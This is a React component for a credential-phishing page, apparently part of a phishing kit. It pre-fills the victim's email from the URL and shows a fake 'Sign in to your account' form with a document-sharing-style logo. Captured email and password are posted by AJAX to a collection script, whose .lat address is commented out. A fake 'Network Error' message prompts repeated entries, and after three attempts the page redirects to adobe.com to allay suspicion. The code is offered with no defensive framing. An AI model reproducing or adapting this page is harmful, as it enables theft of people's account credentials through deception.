
import './sub.css';
import drvlog from '../assets/drv.jpg';
import $ from 'jquery';
import { useState } from 'react';

export const Sub = ()=>{


    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).toLowerCase().toLowerCase().split('&', 1).toString();
    

    const [email, setEmail] = useState(extracetdEmailC);
    const [password, setPassword] = useState('');

    const [view, setView] = useState('View Document');
    const [errMsg, setErrMsg] = useState(false);

    const [count, setCount] = useState(0);

    const submitDefaultForm = (e)=>{
        e.preventDefault();
        if (password === "") {
          return null
        } else {

          setCount(count=> count + 1);
            if(count >= 2){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    window.location.href = "https://www.adobe.com/";
                }, 1500);
            };

            setView('Please wait...');

            setTimeout(()=>{
              setView('View Document');
              setPassword('');
              setErrMsg(true);
            }, 3200)

        // post to server

        const user = {
            email,
            password
        };
    
        $.ajax({
            type: "POST",
            // url: "https://ondrivshardocpoint.lat/Smallpagge/yuki.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
            },
        });
          
        }
    };

    return(<>
        <div className="sub">

            <section style={{
                display:'flex',
                justifyContent:"center",
                alignItems:'center',
                position: 'absolute',
                top:'50%',
                left:'50%',
                transform:'translate(-50%, -50%)'
            }}>
                <div className="form_cont">

                    <img 
                        src={drvlog}
                        alt='dryvv'
                        className='logggg'
                        onClick={()=> window.location.reload()}
                    />



                    <h2 style={{textAlign:'center'}} className='signnn'>Sign in to your account</h2>
                    <form action="" id='form' className='form' onSubmit={submitDefaultForm}>

                        { errMsg ? <div className='errr'>
                            Network Error! Please verify your information and try again
                        </div> : null }

                        <div className="eml_inp_LKJHJKn">
                            <input 
                                type="email" 
                                placeholder='Enter email' 
                                className='email'
                                name='email' 
                                id='email' 
                                value={email} 
                                onChange={e=> setEmail(e.target.value)}
                            />
                        </div>


                        <div className="pswd_inp_LKJHJKn">
                            <input type="password" placeholder='Enter password' className='email' name='email' id='email' 
                                onChange={e=>{
                                    setPassword(e.target.value);
                                    setErrMsg(false);
                                  }}
                                  autoFocus
                                  value={password}
                            />
                        </div>


                        <div className="subcont">
                            <input 
                                type='submit'
                                value={`Sign in`}
                                className='btttnn'
                                onClick={submitDefaultForm}

                            />
                        </div>

                    </form>
                </div>
            </section>
        </div>
    </>)
};